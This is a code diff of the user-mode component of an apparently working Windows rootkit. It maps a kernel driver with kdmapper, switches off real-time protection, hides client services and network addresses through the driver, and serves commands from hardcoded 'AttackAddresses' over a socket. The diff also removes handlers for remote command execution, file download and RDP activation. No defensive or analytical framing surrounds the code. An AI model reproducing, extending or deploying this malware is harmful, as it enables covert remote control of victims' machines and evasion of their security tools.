@@ -5,48 +5,14 @@
 
 // Global medium variables:
 const char* MainPipeName = "\\\\.\\pipe\\ShrootPipe";
-
-
-int TerminateMedium(NETWORK_INFO* SndInfo, HANDLE* PipeHandle, BOOL* IsValidPipe, int ReturnStatus) {
-	if (SndInfo != NULL) {
-		closesocket(SndInfo->AsoSock);
-	}
-	if (IsValidPipe != NULL) {
-		*IsValidPipe = FALSE;
-	}
-	if (PipeHandle != NULL) {
-		DisconnectNamedPipe(*PipeHandle);
-		ClosePipe(PipeHandle);
-	}
-	return ReturnStatus;
-}
-
-
-DWORD ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
-	DWORD LastError = 0;
-	*IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
-	if (!*IsValidPipe) {
-		LastError = GetLastError();
-		if (LastError == ERROR_PIPE_CONNECTED) {
-			*IsValidPipe = TRUE;
-			RequestHelpers::LogMessage("MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", MediumLog, FALSE, 0);
-		}
-		else {
-			RequestHelpers::LogMessage("MainMedium pipe - error while connecting to pipe\n", MediumLog, TRUE, LastError);
-			ClosePipe(PipeHandle);
-		}
-	}
-	else {
-		RequestHelpers::LogMessage("MainMedium pipe - driver connected to pipe like expected\n", MediumLog, FALSE, 0);
-	}
-	return LastError;
-}
+char MediumIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
+char ClientIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
 
 
 int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
 	int OprResult = 0;
 	DWORD LastError = 0;
-	PASS_DATA result;
+	PASS_DATA SocketResult;
 	PVOID SendBuf = NULL;
 	ULONG SendSize = 0;
 	ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
@@ -77,18 +43,19 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 			}
 
 			// Connect to driver client with pipe:
-			ConnectToNamedPipe(PipeHandle, MediumLog, IsValidPipe);
+			MajorOperation::ConnectToNamedPipe(PipeHandle, MediumLog, IsValidPipe);
 		}
+
 
 		// Actual medium operations:
 		while (*IsValidPipe) {
 
 			// Get operation to perform:
-			result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
-			if (result.err || result.value != sizeof(RootStat)) {
-				if (result.Term) {
+			SocketResult = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
+			if (SocketResult.err || SocketResult.value != sizeof(RootStat)) {
+				if (SocketResult.Term) {
 					RequestHelpers::LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
-					return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
+					return MajorOperation::TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
 				}
 				break;
 			}
@@ -96,20 +63,20 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 
 				// Special error/event occured, should quit and stop working:
 				RootStat = RKOP_TERMINATE;
-				result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0, MediumLog);
-				if (!result.err && result.value == sizeof(RootStat)) {
-					result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
-					if (!result.err && result.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
+				SocketResult = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0, MediumLog);
+				if (!SocketResult.err && SocketResult.value == sizeof(RootStat)) {
+					SocketResult = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0, MediumLog);
+					if (!SocketResult.err && SocketResult.value == sizeof(RootStat) && RootStat == RKOP_TERMINATE) {
 						RequestHelpers::LogMessage("Termination initiated from here accepted by client\n", MediumLog, FALSE, 0);
 					}
 				}
-				return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
+				return MajorOperation::TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
 			}
 
 
 			// resend the type of request back to client:
-			result = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0, MediumLog);
-			if (result.err || result.value != sizeof(RootStat)) {
+			SocketResult = root_internet::SendData(SndInfo.AsoSock, &RootStat, sizeof(RootStat), FALSE, 0, MediumLog);
+			if (SocketResult.err || SocketResult.value != sizeof(RootStat)) {
 				continue;
 			}
 
@@ -182,8 +149,8 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 					break;
 				}
 
-				result = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0, MediumLog);
-				if (result.err || result.value != sizeof(AttrBufferSize)) {
+				SocketResult = root_internet::RecvData(SndInfo.AsoSock, sizeof(AttrBufferSize), &AttrBufferSize, FALSE, 0, MediumLog);
+				if (SocketResult.err || SocketResult.value != sizeof(AttrBufferSize)) {
 					RequestHelpers::LogMessage("Cannot get size of initial system buffer\n", MediumLog, TRUE, GetLastError());
 					free(InitialString);
 					break;
@@ -196,8 +163,8 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 					SysErrInit = memalloc;
 				}
 				if (SysErrInit == successful) {
-					result = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0, MediumLog);
-					if (result.err || result.value != AttrBufferSize) {
+					SocketResult = root_internet::RecvData(SndInfo.AsoSock, (int)AttrBufferSize, AttrBuffer, FALSE, 0, MediumLog);
+					if (SocketResult.err || SocketResult.value != AttrBufferSize) {
 						RequestHelpers::LogMessage("Cannot get initial system buffer\n", MediumLog, TRUE, GetLastError());
 						free(AttrBuffer);
 						free(InitialString);
@@ -247,40 +214,10 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				free(InitialString);
 				break;
 
-			case RKOP_HIDEPORT:
+			case RKOP_HIDEADDR:
 
 				// Hide ports by dynamic request:
-				OprResult = DriverCalls::HidePortCommunicationKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
-				if (OprResult != 1) {
-					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
-				}
-				free(InitialString);
-				break;
-
-			case RKOP_GETFILE:
-
-				// Get file from target machine:
-				OprResult = RegularRequests::DownloadFileRequest(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, MediumLog);
-				if (OprResult != 1) {
-					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
-				}
-				free(InitialString);
-				break;
-				
-			case RKOP_EXECOMMAND:
-
-				// Execute cmd command:
-				OprResult = RegularRequests::RemoteCommandRequest(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, MediumLog);
-				if (OprResult != 1) {
-					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
-				}
-				free(InitialString);
-				break;
-
-			case RKOP_ACTIVATERDP:
-
-				// Activate RDP service:
-				OprResult = RegularRequests::ActivateRDPRequest(SndInfo.AsoSock, &OprBuffer, MediumLog);
+				OprResult = DriverCalls::HideNetworkingKernelCall(SndInfo.AsoSock, &OprBuffer, (char*)InitialString, PipeHandle, MediumLog);
 				if (OprResult != 1) {
 					RequestHelpers::LogMessage("Failed operation (sending of returned struct / receiving OG struct / unexpected error)\n", MediumLog, TRUE, GetLastError());
 				}
@@ -288,9 +225,9 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 				break;
 
 			default:
-				if (result.Term) {
+				if (SocketResult.Term) {
 					RequestHelpers::LogMessage("Critical error occured, closing connection with specific client..\n", MediumLog, TRUE, GetLastError());
-					return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
+					return MajorOperation::TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, -1);
 				}
 				break;
 			}
@@ -301,33 +238,31 @@ int ServeClient(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, 
 			SendBuf = NULL;
 			SysErrInit = successful;
 			if (OprResult == -1) {
-				return TerminateMedium(NULL, PipeHandle, IsValidPipe, -1);  // No need to close socket
+				return MajorOperation::TerminateMedium(NULL, PipeHandle, IsValidPipe, -1);  // No need to close socket
 			}
 			OprResult = 0;
 			RequestHelpers::LogMessage("Current medium iteration finished\n", MediumLog, FALSE, 0);
 		}
 	}
-	return TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
+	return MajorOperation::TerminateMedium(&SndInfo, PipeHandle, IsValidPipe, 0);
 }
 
 
 int main(int argc, char* argv[]) {
 	SOCKET MediumSocket;
 	int SockaddrLen = sizeof(sockaddr);
-	char MediumIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
-	char ClientIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
 	USHORT MediumConnectionPort = 44444;
 	USHORT ClientConnectionPort = 44444;
 	NETWORK_INFO ConnectionConfigArray[3];
 
+	HANDLE CurrentThreadHandle = INVALID_HANDLE_VALUE;
 	HANDLE PipeHandle = INVALID_HANDLE_VALUE;
 	BOOL IsValidPipe = FALSE;
 	DWORD LastError = 0;
 	LogFile MediumLog = { 0 };
 	RETURN_LAST ReturnStatus = { 0 };
 	int MediumResult = 0;
-	const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1~192.168.1.32";  // Possible addresses of client
-	
+	const char* AttackAddresses = "172.17.80.1~192.168.1.32~192.168.56.1~192.168.192.1~192.168.88.1";
 	MediumLog.InitiateFile("C:\\nosusfolder\\verysus\\MediumLogFile.txt");
 
 
@@ -359,9 +294,22 @@ int main(int argc, char* argv[]) {
 
 
 	// Make sure that all depended-on files exist on target machine (folders + files):
+	ReturnStatus = RootkitInstall::RealTime(TRUE);
+	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
+		MediumLog.CloseLog();
+		return 0;
+	}
 	LastError = RootkitInstall::VerifyDependencies(ClientIP);
 	if (LastError != 0) {
+		MediumLog.CloseLog();
 		return LastError;
+	}
+
+
+	// Set up default services (file/screen-sharing, cracking and shell with pipe):
+	if (!MajorOperation::InitializeClientServices()) {
+		MediumLog.CloseLog();
+		return 0;
 	}
 
 
@@ -373,24 +321,16 @@ int main(int argc, char* argv[]) {
 
 
 	// Activate kdmapper with driver as parameter:
-	ReturnStatus = RootkitInstall::RealTime(TRUE);
-	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
-		return 0;
-	}
 	if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
 		RequestHelpers::LogMessage("Failed to activate service manager with driver as parameter\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		return 0;
 	}
 	RequestHelpers::LogMessage("kdmapper mapped driver successfully!\n", &MediumLog, FALSE, 0);
-	ReturnStatus = RootkitInstall::RealTime(FALSE);
-	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
-		return 0;
-	}
 
 
 	// Connect to driver client with pipe initial:
-	LastError = ConnectToNamedPipe(&PipeHandle, &MediumLog, &IsValidPipe);
+	LastError = MajorOperation::ConnectToNamedPipe(&PipeHandle, &MediumLog, &IsValidPipe);
 	if (LastError == ERROR_PIPE_CONNECTED) {
 		IsValidPipe = TRUE;
 		LastError = 0;
@@ -398,7 +338,22 @@ int main(int argc, char* argv[]) {
 	else if (LastError != 0) {
 		MediumLog.CloseLog();
 		DisconnectNamedPipe(PipeHandle);
-		ClosePipe(&PipeHandle);
+		if (PipeHandle != INVALID_HANDLE_VALUE) {
+			CloseHandle(PipeHandle);
+			PipeHandle = INVALID_HANDLE_VALUE;
+		}
+		return 0;
+	}
+
+
+	// Hide default client services with driver:
+	if (!MajorOperation::HideClientServices(&PipeHandle, &MediumLog, GeneralHelpers::CalculateAddressValue(ClientIP))) {
+		MediumLog.CloseLog();
+		DisconnectNamedPipe(PipeHandle);
+		if (PipeHandle != INVALID_HANDLE_VALUE) {
+			CloseHandle(PipeHandle);
+			PipeHandle = INVALID_HANDLE_VALUE;
+		}
 		return 0;
 	}
 
@@ -409,12 +364,26 @@ int main(int argc, char* argv[]) {
 		RequestHelpers::LogMessage("Quitting (internet/socket communication initiation error)..\n", &MediumLog, TRUE, GetLastError());
 		MediumLog.CloseLog();
 		DisconnectNamedPipe(PipeHandle);
-		ClosePipe(&PipeHandle);
-		return 0;
+		if (PipeHandle != INVALID_HANDLE_VALUE) {
+			CloseHandle(PipeHandle);
+			PipeHandle = INVALID_HANDLE_VALUE;
+		}		return 0;
 	}
 
 
 	// Create an infinite loop to keep getting connections from instances of client:
+	ReturnStatus = RootkitInstall::RealTime(FALSE);
+	if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
+		MediumLog.CloseLog();
+		DisconnectNamedPipe(PipeHandle);
+		if (PipeHandle != INVALID_HANDLE_VALUE) {
+			CloseHandle(PipeHandle);
+			PipeHandle = INVALID_HANDLE_VALUE;
+		}
+		closesocket(ConnectionConfigArray[0].AsoSock);
+		WSACleanup();
+		return 0;
+	}
 	while (TRUE) {
 		MediumSocket = accept(ConnectionConfigArray[0].AsoSock, (sockaddr*)&ConnectionConfigArray[1].AddrInfo, &SockaddrLen);
 		if (MediumSocket == INVALID_SOCKET) {
@@ -436,7 +405,10 @@ int main(int argc, char* argv[]) {
 			WSACleanup();
 			MediumLog.CloseLog();
 			DisconnectNamedPipe(PipeHandle);
-			ClosePipe(&PipeHandle);
+			if (PipeHandle != INVALID_HANDLE_VALUE) {
+				CloseHandle(PipeHandle);
+				PipeHandle = INVALID_HANDLE_VALUE;
+			}
 			return 0;
 		}
 	}
@@ -445,6 +417,9 @@ int main(int argc, char* argv[]) {
 	WSACleanup();
 	MediumLog.CloseLog();
 	DisconnectNamedPipe(PipeHandle);
-	ClosePipe(&PipeHandle);
+	if (PipeHandle != INVALID_HANDLE_VALUE) {
+		CloseHandle(PipeHandle);
+		PipeHandle = INVALID_HANDLE_VALUE;
+	}
 	return 1;
 }
